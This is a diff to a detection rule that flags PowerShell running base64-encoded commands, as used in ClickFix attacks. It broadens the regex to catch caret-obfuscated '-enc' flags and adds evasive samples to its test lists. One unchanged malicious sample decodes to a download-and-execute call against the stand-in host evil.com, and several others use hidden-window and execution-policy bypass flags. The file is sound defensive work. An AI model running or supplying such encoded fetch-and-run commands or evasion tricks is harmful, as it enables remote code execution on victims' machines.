@@ -4,7 +4,7 @@ description: >
   Detects PowerShell executing base64-encoded commands. Strong indicator of ClickFix attacks hiding malicious payloads.
 
 pattern: |
-  (?i)powershell.*?-e(?:nc?(?:oded)?(?:command)?)?\s+[A-Za-z0-9+/]{20,}={0,2}
+  (?i)powershell.*-\s*(?:e|enc|encodedcommand)(?:\^?[a-z])*?\s+[A-Za-z0-9+/]{20,}={0,2}
 
 malicious:
   - "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcAAuAHAAcwAxACIAKQA="
@@ -19,6 +19,9 @@ malicious:
   - "powershell.exe -nop -ep bypass -enc cwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwAgAGMAYQBsAGMA"
   - "cmd /c powershell -e VwByAGkAdABlAC0ASABvAHMAdAAgACIATQBhAGwAaQBjAGkAbwB1AHMAIQ=="
   - "powershell -ep bypass -w hidden -encodedcommand ZQB4AGUAYwAoACIAbQBhAGwAaQBjAGkAbwB1AHMAIABJAG4AZgBvAHIAbQBhAHQAaQBvAG4AIgApAA=="
+  - "powershell -E^N^C SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
+  - "powershell.exe -e^n^c^o^d^e^d^c^o^m^m^a^n^d JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA="
+  - "cmd /c powershell -e^nc VwByAGkAdABlAC0ASABvAHMAdAAgACIATQBhAGwAaQBjAGkAbwB1AHMAIQ=="
 
 benign:
   - 'powershell -Command "Get-Process"'
